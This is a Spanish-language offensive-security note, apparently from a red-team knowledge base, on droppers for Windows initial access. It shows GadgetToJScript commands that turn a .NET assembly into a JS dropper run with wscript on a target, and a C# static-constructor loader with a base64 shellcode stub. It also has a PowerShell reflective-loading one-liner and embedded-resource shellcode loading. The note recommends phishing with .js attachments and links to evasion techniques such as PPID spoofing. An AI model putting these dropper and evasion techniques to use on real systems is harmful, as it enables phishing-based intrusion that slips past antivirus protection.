---
tags: [initial-access, dropper, jscript, dotnet]
status: done
platform: windows
---

# Droppers

> Mecanismos de entrega de payload que no son el payload en sí: wrappers que cargan y ejecutan.

---

## GadgetToJScript

Convierte un assembly .NET en un script JS/VBS que lo carga en memoria sin tocar disco.

```
# Generar el dropper JS
GadgetToJScript.exe -b -w js -o dropper TuAssembly.dll

# Ejecutar en target
wscript.exe dropper.js
```

**Cómo funciona:** Serializa el assembly como un gadget de deserialización .NET y lo embebe en JS. Al ejecutar, el motor de scripting deserializa y ejecuta el assembly en memoria.

**Uso típico:** Phishing con adjunto `.js` → execution sin tocar el disco con binarios sospechosos.

---

## .NET Class Library + Runner

```csharp
// Estructura de la DLL dropper
public class Loader {
    static Loader() {
        // Constructor estático → ejecuta al cargar el tipo
        byte[] shellcode = Convert.FromBase64String("...");
        // Inject shellcode aquí
    }
}
```

```powershell
# Cargar y ejecutar desde PowerShell
[System.Reflection.Assembly]::Load([Convert]::FromBase64String("BASE64_DLL"))
[Loader]::new()
```

---

## Embedded Resources

Embeber el payload dentro de otro ejecutable legítimo como recurso:

```csharp
// En C# — leer recurso embebido
var assembly = Assembly.GetExecutingAssembly();
using (Stream s = assembly.GetManifestResourceStream("App.payload.bin"))
{
    byte[] buf = new byte[s.Length];
    s.Read(buf, 0, buf.Length);
    // Ejecutar buf como shellcode
}
```

**Ventaja:** AV estático solo ve el ejecutable wrapper, no el payload raw.

---

## OPSEC

> ⚠️ Combinar dropper con técnicas de evasión:
> - [[06 EVASION & OPSEC/Artifact Evasion/Artifact Kit]] para el shellcode
> - [[06 EVASION & OPSEC/Memory Evasion/Sleep Obfuscation]] para el beacon
> - PPID Spoofing para el proceso padre → [[06 EVASION & OPSEC/Process Injection/PPID Spoofing]]

